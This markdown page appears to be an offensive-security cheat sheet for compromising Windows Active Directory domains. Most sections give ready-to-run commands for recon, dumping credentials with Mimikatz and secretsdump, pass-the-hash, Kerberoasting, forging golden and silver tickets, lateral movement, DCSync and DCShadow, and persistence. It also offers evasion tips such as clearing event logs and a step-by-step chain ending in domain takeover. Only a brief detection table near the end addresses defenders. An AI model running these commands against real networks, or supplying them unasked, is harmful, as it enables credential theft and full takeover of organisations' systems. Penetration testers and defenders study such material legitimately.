---
icon: folder-open
---

# Active Directory

## **Active Directory Attacks ‚Äî Conquering the Domain**

***

Active Directory is the **spine of enterprise infrastructure**.\
It stores user accounts, policies, Kerberos tickets, and trust relationships.\
Mastering AD exploitation means mastering **corporate network compromise** ‚Äî privilege escalation, credential abuse, and lateral movement at scale.

***

### I. üß© Core Concepts

| Term                       | Description                                                       |
| -------------------------- | ----------------------------------------------------------------- |
| **Domain Controller (DC)** | Central AD server managing authentication.                        |
| **Kerberos**               | Ticket-based authentication protocol.                             |
| **LDAP**                   | Directory access protocol for querying user objects.              |
| **Trust**                  | Relationship between domains allowing authentication across them. |
| **SAM / NTDS.dit**         | Files storing hashes and credentials.                             |
| **Group Policy (GPO)**     | Configuration management system.                                  |

***

### II. ‚öôÔ∏è Reconnaissance & Enumeration

#### üß† Identify Domain Information

```bash
whoami /all
ipconfig /all
nltest /dsgetdc:<domain>
net view /domain
```

#### üß© Enumerate Domain Users & Groups

```bash
net user /domain
net group "Domain Admins" /domain
```

#### ‚öôÔ∏è LDAP Enumeration

```bash
ldapsearch -x -H ldap://dc.example.local -D "" -b "dc=example,dc=local"
```

#### üß† Automated Recon

```bash
bloodhound-python -u user -p pass -d example.local -c All --zip
```

Upload to **BloodHound GUI** ‚Üí visualize privilege paths.

***

### III. üí£ Credential Harvesting Techniques

#### ‚öôÔ∏è Mimikatz (on Windows)

```bash
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
```

#### üß† Dump LSASS Memory (offline)

```bash
procdump64.exe -ma lsass.exe lsass.dmp
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords"
```

#### ‚öôÔ∏è Extract from NTDS.dit

```bash
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

#### üí£ Pass-the-Hash (PTH)

```bash
pth-winexe -U 'Administrator%aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0' //10.0.0.5 cmd
```

***

### IV. üß† Kerberos-Based Attacks

#### üß© Kerberoasting

Extract service tickets (TGS) for SPNs, then crack offline.

```bash
GetUserSPNs.py example.local/user:pass -outputfile hashes.kerberoast
hashcat -m 13100 hashes.kerberoast rockyou.txt
```

#### üí£ AS-REP Roasting

Users with _Do not require pre-authentication_ flag set.

```bash
GetNPUsers.py example.local/ -usersfile users.txt -format hashcat -outputfile asrep.hash
hashcat -m 18200 asrep.hash rockyou.txt
```

#### ‚öôÔ∏è Golden Ticket

Full domain compromise by forging TGT.

```bash
mimikatz.exe "kerberos::golden /user:Administrator /domain:example.local /sid:S-1-5-21-111222333 /krbtgt:HASH /ticket:golden.kirbi"
```

#### üß† Silver Ticket

Forged TGS for a specific service.

```bash
mimikatz.exe "kerberos::golden /user:svc_admin /domain:example.local /sid:S-1-5-21-111222333 /target:dc.example.local /service:cifs /rc4:HASH"
```

***

### V. ‚öôÔ∏è Lateral Movement Techniques

| Technique    | Tool             | Description                         |
| ------------ | ---------------- | ----------------------------------- |
| **PsExec**   | impacket-psexec  | Executes commands via SMB service.  |
| **WMI Exec** | impacket-wmiexec | Remote command execution over WMI.  |
| **SMBExec**  | impacket-smbexec | Fileless remote shell.              |
| **WinRM**    | evil-winrm       | PowerShell-based access for admins. |

#### üß© Examples

```bash
psexec.py Administrator@10.0.0.5 cmd.exe
wmiexec.py user:pass@10.0.0.5
evil-winrm -i 10.0.0.5 -u Administrator -p Password123
```

***

### VI. üß† Privilege Escalation within Domain

#### ‚öôÔ∏è Find Misconfigured Service Accounts

```bash
Get-ADUser -Filter * -Properties ServicePrincipalName
```

#### üí£ Exploit Delegation

* **Unconstrained delegation** ‚Üí steal TGT from memory.
* **Constrained delegation** ‚Üí abuse `msDS-AllowedToDelegateTo`.
* **Resource-based constrained delegation (RBCD)** ‚Üí control via ACL abuse.

```bash
rbcd.py -dc-ip 10.0.0.1 -t victim -f attacker
```

***

### VII. ‚öôÔ∏è ACL & GPO Abuse

#### üß© Enumerate Privileges

```bash
Get-ObjectAcl -DistinguishedName "CN=Domain Admins,CN=Users,DC=example,DC=local"
```

#### üí£ Modify GPO for Code Execution

```bash
powershell -c "New-GPO -Name EvilPolicy"
Set-GPPermission -Name EvilPolicy -PermissionLevel GpoEditDeleteModifySecurity -TargetName 'Domain Users' -TargetType Group
```

***

### VIII. üß† Abusing Trust Relationships

#### ‚öôÔ∏è Enumerate Trusts

```bash
nltest /domain_trusts
```

#### üí£ SID History Injection

```bash
mimikatz "lsadump::trust /patch"
```

#### üß† Cross-Domain Kerberoasting

```bash
GetUserSPNs.py child.local/user:pass -dc-ip 10.0.0.1 --request-user admin@parent.local
```

***

### IX. ‚öôÔ∏è Credential Dumping from Workstations

#### üß© Registry Hive Extraction

```bash
reg save HKLM\SYSTEM system.save
reg save HKLM\SAM sam.save
secretsdump.py -sam sam.save -system system.save LOCAL
```

#### ‚öôÔ∏è Cached Credentials

```bash
mimikatz "lsadump::cache"
```

***

### X. ‚öôÔ∏è Pass-the-Ticket (PTT)

Steal valid TGT and reuse it:

```bash
mimikatz "sekurlsa::tickets /export"
klist add tgt.kirbi
dir \\dc\C$
```

Works without knowing the user‚Äôs password.

***

### XI. üß† DCShadow Attack

Push rogue replication updates directly to AD.

```bash
mimikatz "lsadump::dcshadow /object:Administrator /attribute:member /value:CN=eviluser,CN=Users,DC=example,DC=local"
```

***

### XII. ‚öôÔ∏è DCSync Attack

Mimic domain replication to extract all hashes.

```bash
secretsdump.py example.local/Administrator:Pass@10.0.0.1
```

or

```bash
mimikatz "lsadump::dcsync /domain:example.local /user:krbtgt"
```

***

### XIII. üíÄ Persistence in Active Directory

| Method                    | Description                               |
| ------------------------- | ----------------------------------------- |
| **Golden Ticket**         | Reuse forged TGT indefinitely.            |
| **SID History Injection** | Maintain hidden domain admin privileges.  |
| **Skeleton Key**          | Patch LSASS to accept master password.    |
| **AdminSDHolder Abuse**   | Force permissions inheritance every hour. |
| **DCShadow**              | Re-introduce malicious changes silently.  |

***

### XIV. ‚öôÔ∏è Detection Evasion

‚úÖ **Operational Security (OPSEC) Tips**

* Avoid noisy enumeration (`net group /domain`) on sensitive hosts.
* Use `-k` (Kerberos auth) instead of NTLM where possible.
* Clear event logs after exploitation (only in labs/CTFs).
* Randomize ticket lifetimes and usernames when forging.

***

### XV. ‚öôÔ∏è AD Exploitation Toolset

| Category           | Tool                        | Usage                  |
| ------------------ | --------------------------- | ---------------------- |
| Recon              | BloodHound, SharpHound      | Privilege path mapping |
| Credential Dumping | Mimikatz, secretsdump.py    | Hash extraction        |
| Kerberos Abuse     | Impacket, Rubeus            | Ticket operations      |
| Lateral Movement   | PsExec, Evil-WinRM, SMBExec | Remote shells          |
| Persistence        | DCShadow, AdminSDHolder     | Stealth access         |
| Visualization      | BloodHound GUI              | Attack path analysis   |

***

### XVI. ‚öîÔ∏è Real-World Attack Chain Example

```bash
# 1. Enumerate Domain Users
net user /domain

# 2. Kerberoast Service Accounts
GetUserSPNs.py corp.local/user:pass -output hashes.txt

# 3. Crack Hash
hashcat -m 13100 hashes.txt rockyou.txt

# 4. Use Cracked Creds for Lateral Movement
psexec.py svc_admin@10.0.0.5 cmd.exe

# 5. Dump NTDS.dit on Domain Controller
secretsdump.py -just-dc corp.local/Administrator@10.0.0.10

# 6. Forge Golden Ticket
mimikatz "kerberos::golden /domain:corp.local /sid:S-1-5-21-1337 /krbtgt:<hash> /user:Administrator"
```

Result ‚Üí Full Domain Takeover üè¥‚Äç‚ò†Ô∏è

***

### XVII. üß© Defensive Notes (Blue Team Awareness)

| Detection               | Indicator                                     |
| ----------------------- | --------------------------------------------- |
| **Kerberoasting**       | Large number of TGS requests.                 |
| **AS-REP Roasting**     | Users without pre-auth logging.               |
| **Golden Ticket**       | Anomalous TGT lifetime >10 hours.             |
| **DCSync/DCShadow**     | Replication service started from non-DC host. |
| **AdminSDHolder Abuse** | Unexpected ACLs on AdminSDHolder object.      |

***

### XVIII. ‚öôÔ∏è Quick Reference Table

| Technique       | Tool                | Command             |
| --------------- | ------------------- | ------------------- |
| Kerberoast      | Impacket            | `GetUserSPNs.py`    |
| AS-REP Roast    | Impacket            | `GetNPUsers.py`     |
| Pass-the-Hash   | Impacket            | `psexec.py`         |
| Pass-the-Ticket | Mimikatz            | `kerberos::ptt`     |
| DCSync          | Mimikatz / Impacket | `lsadump::dcsync`   |
| ACL Abuse       | PowerView           | `Get-ObjectAcl`     |
| Persistence     | Mimikatz            | `lsadump::dcshadow` |

***
